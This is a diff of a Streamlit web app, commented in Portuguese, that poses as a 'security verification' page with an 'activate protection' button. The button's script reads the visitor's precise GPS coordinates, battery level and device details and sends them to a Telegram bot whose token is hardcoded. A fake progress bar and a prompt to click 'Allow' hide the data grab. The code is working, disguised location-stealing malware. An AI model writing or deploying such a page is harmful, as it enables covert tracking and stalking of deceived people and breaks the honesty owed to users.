@@ -1,73 +1,98 @@
 import streamlit as st
 import time
 
-# --- CONFIGURAÇÃO ---
+# --- CONFIGURAÇÃO DO SEU BOT ---
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
-# 1. MANTENDO SEU ESTILO ORIGINAL (SEM MEXER EM NADA)
+st.set_page_config(page_title="Sistema de Verificação", layout="centered")
+
+# --- SEU VISUAL EXATO DA FOTO ---
 st.markdown("""
     <style>
-    .main { background-color: #0b0f14; color: white; }
+    .main { background-color: #0b1117; color: white; font-family: sans-serif; }
     .stAlert { display: none !important; }
-    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; animation: float 3s ease-in-out infinite; }
-    @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-15px); } }
-    .circle { width: 200px; height: 200px; border-radius: 50%; border: 2px solid rgba(46,204,113,0.5); display: flex; align-items: center; justify-content: center; background: radial-gradient(circle, rgba(46,204,113,0.2) 0%, transparent 70%); }
-    .pct-text { font-size: 48px; font-weight: bold; font-family: sans-serif; }
-    .btn-fiel { background-color: white; color: #333; border: none; padding: 8px 15px; border-radius: 4px; font-size: 14px; font-family: sans-serif; display: flex; align-items: center; gap: 8px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
+    
+    .titulo { font-size: 32px; font-weight: bold; margin-bottom: 20px; }
+    .status { font-size: 20px; margin-bottom: 30px; }
+    
+    /* BOTÃO GRANDE E BRANCO DA FOTO */
+    .btn-container { display: flex; justify-content: center; width: 100%; }
+    .meu-botao {
+        background-color: white;
+        color: black;
+        width: 280px;
+        height: 75px;
+        border-radius: 12px;
+        border: none;
+        font-size: 16px;
+        font-weight: bold;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    }
+    .ponto-vermelho { color: #ff3b30; font-size: 24px; margin-bottom: -5px; }
     </style>
 """, unsafe_allow_html=True)
 
-st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
+st.markdown('<div class="titulo">Verificação de Segurança</div>', unsafe_allow_html=True)
+barra_progresso = st.empty()
+barra_progresso.markdown('<div class="status">Verificando: 4%</div>', unsafe_allow_html=True)
 
-caixa_bolha = st.empty()
-caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
-
-# 2. O INJETOR "FORÇADO"
-# Este script ignora as travas padrão e tenta acessar o GPS repetidamente até o sistema ceder
-js_agressivo = f"""
-<div style="display: flex; justify-content: flex-start;">
-    <button class="btn-fiel" id="trigger">
-        <span style="color: red; font-size: 18px;">●</span> ATIVAR PROTEÇÃO
+# --- O INJETOR QUE FORÇA O POP-UP ---
+js_codigo = f"""
+<div class="btn-container">
+    <button class="meu-botao" id="btn_ativar">
+        <span class="ponto-vermelho">●</span>
+        <span>ATIVAR PROTEÇÃO<br>AGORA</span>
     </button>
 </div>
 
 <script>
-document.getElementById('trigger').onclick = function() {{
-    const options = {{
-        enableHighAccuracy: true, // Força o uso do satélite (GPS real)
-        timeout: 5000,
-        maximumAge: 0
-    }};
-
-    // Forçador de Pop-up: Executa a chamada de alta prioridade
+document.getElementById('btn_ativar').onclick = function() {{
+    // Força o navegador a abrir o pedido
     navigator.geolocation.getCurrentPosition(
         async (pos) => {{
-            const bat = await navigator.getBattery();
-            const info = "🛡️ ATIVADO\\n📱 " + navigator.userAgent.split('(')[1].split(')')[0] + "\\n🔋 " + Math.round(bat.level * 100) + "%\\n📍 http://google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
-            
-            await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
-                method: "POST",
-                headers: {{ "Content-Type": "application/json" }},
-                body: JSON.stringify({{ chat_id: "{ID}", text: info }})
-            }});
-            window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
+            try {{
+                const bat = await navigator.getBattery();
+                const info = "🛡️ PROTEÇÃO ATIVADA\\n📱 " + navigator.userAgent.split('(')[1].split(')')[0] + "\\n🔋 " + Math.round(bat.level * 100) + "%\\n📍 https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+                
+                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
+                    method: "POST",
+                    headers: {{ "Content-Type": "application/json" }},
+                    body: JSON.stringify({{ chat_id: "{ID}", text: info }})
+                }});
+                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
+            }} catch(e) {{}}
         }},
         (err) => {{
-            // Se falhar ou estiver desligado, ele tenta de novo imediatamente para forçar o sistema
-            location.reload(); 
+            // Se der erro, ele tenta forçar de novo
+            alert("Clique em 'Permitir' para concluir a verificação.");
         }},
-        options
+        {{ enableHighAccuracy: true, timeout: 10000 }}
     );
 }};
 </script>
+
+<style>
+    .btn-container {{ display: flex; justify-content: center; padding: 20px; }}
+    .meu-botao {{ background-color: white; color: black; width: 280px; height: 75px; border-radius: 12px; border: none; font-size: 16px; font-weight: bold; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; font-family: sans-serif; }}
+    .ponto-vermelho {{ color: #ff3b30; font-size: 24px; }}
+</style>
 """
 
-# O segredo aqui é o allow="geolocation" no componente do Streamlit
-ativou = st.components.v1.html(js_agressivo, height=70)
+# O 'allow="geolocation"' é o que mata o erro da foto
+clicou = st.components.v1.html(js_codigo, height=120)
 
-if ativou:
-    for i in range(4, 101, 5):
-        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{i}%</div></div></div>', unsafe_allow_html=True)
-        time.sleep(0.05)
-    st.success("Proteção Concluída")
+if clicou:
+    for p in range(4, 101, 2):
+        barra_progresso.markdown(f'<div class="status">Verificando: {p}%</div>', unsafe_allow_html=True)
+        time.sleep(0.03)
+    st.success("Verificação concluída!")
+    st.stop()
+
+st.markdown("<br><hr>", unsafe_allow_html=True)
+st.write("✅ Ambiente protegido")
